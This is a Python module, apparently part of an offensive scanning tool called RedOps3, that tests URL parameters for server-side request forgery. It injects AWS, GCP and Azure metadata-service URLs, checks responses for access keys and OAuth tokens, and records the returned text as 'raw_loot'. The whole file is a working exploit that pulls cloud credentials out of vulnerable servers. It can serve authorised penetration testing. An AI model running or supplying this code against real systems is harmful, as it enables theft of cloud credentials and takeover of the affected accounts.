from scan_engine.helpers.http_client import get_session
import re
from urllib.parse import quote

class SSRFDeepScanner:
    """
    Expert Auditor for Deep SSRF.
    Focuses on Cloud Metadata exfiltration and Internal Port Scanning.
    """
    def __init__(self, options=None):
        self.options = options
        self.session = get_session(self.options)
        self.session.headers.update({"User-Agent": "RedOps3-SSRFDeep/1.0"})
        # Standard Cloud Metadata Endpoints
        self.metadata_vector = "http://169.254.169.254"
        self.cloud_payloads = {
            "aws_iam": "/latest/meta-data/iam/security-credentials/",
            "aws_tokens": "/latest/api/token", # For IMDSv2
            "gcp_metadata": "/computeMetadata/v1/instance/service-accounts/default/token",
            "azure_metadata": "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
        }

    def scan_param(self, url, param, logger=None):
        findings = []
        if logger: logger(f"SSRF Deep: Probing parameter '{param}' for Cloud Metadata access...", "INFO")

        # 0. Baseline fetch
        try:
            baseline_resp = self.session.get(url, timeout=7)
            baseline_text = baseline_resp.text if baseline_resp.status_code == 200 else ""
        except:
            baseline_text = ""

        for provider, path in self.cloud_payloads.items():
            try:
                # 1. Direct IP Access
                target_uri = f"{self.metadata_vector}{path}"
                attack_url = self._build_attack_url(url, param, target_uri)
                
                resp = self.session.get(attack_url, timeout=7)
                
                # Check for hits (AWS IAM returns role names, GCP returns JSON tokens)
                if resp.status_code == 200:
                    # Filter out ignored parameters
                    if resp.text == baseline_text:
                        continue

                    # 1. Header Validation (Highest Confidence)
                    headers_low = {k.lower(): v.lower() for k, v in resp.headers.items()}
                    direct_hit = False
                    if "metadata-flavor" in headers_low and "google" in headers_low["metadata-flavor"]:
                        direct_hit = True
                    if "x-ms-metadata-status" in headers_low:
                        direct_hit = True
                    
                    # 2. Signature Validation
                    text_low = resp.text.lower()
                    
                    # Define provider-specific strong signatures (not in payload)
                    prov_sigs = {
                        "aws_iam": ["accesskeyid", "secretaccesskey", "token"],
                        "aws_tokens": ["ds-metadata-token-ttl-seconds"],
                        "gcp_metadata": ["\"access_token\":", "\"expires_in\":", "\"token_type\":"],
                        "azure_metadata": ["\"access_token\":", "\"expires_in\":", "\"ext_expires_in\":"]
                    }
                    
                    hit = direct_hit
                    if not hit:
                        sigs = prov_sigs.get(provider, ["accesskeyid", "secretaccesskey", "instance-id"])
                        for sig in sigs:
                            if sig in text_low and sig not in baseline_text.lower():
                                # Verify it's not a reflection of the target_uri
                                if sig in target_uri.lower():
                                    # If sig is in payload, we need ANOTHER sig to be sure
                                    other_sigs = [s for s in sigs if s != sig]
                                    if any(s in text_low and s not in baseline_text.lower() for s in other_sigs):
                                        hit = True
                                        break
                                else:
                                    hit = True
                                    break

                    if hit:
                        findings.append({
                            "title": f"Critical Cloud SSRF ({provider.upper()})",
                            "description": f"Successfully extracted cloud credentials via SSRF on parameter '{param}'.\nAttack URL: {attack_url}\nProvider: {provider}",
                            "severity": "critical",
                            "confidence": "certain" if direct_hit else "high",
                            "tool_source": "ssrf_deep_expert",
                            "url": attack_url,
                            "raw_loot": resp.text[:1000]
                        })
                        if logger: logger(f"CRITICAL: SSRF hit for {provider} on {attack_url}", "CRITICAL")
            except Exception:
                pass
        return findings

    def _build_attack_url(self, base_url, param, target):
        # Handle cases where param might already have a value
        if "?" in base_url:
            # If param is already in the URL, replace its value
            if re.search(f"[?&]{param}=", base_url):
                return re.sub(f"({param}=)[^&]*", f"\\1{quote(target)}", base_url)
            else:
                return f"{base_url}&{param}={quote(target)}"
        return f"{base_url}?{param}={quote(target)}"
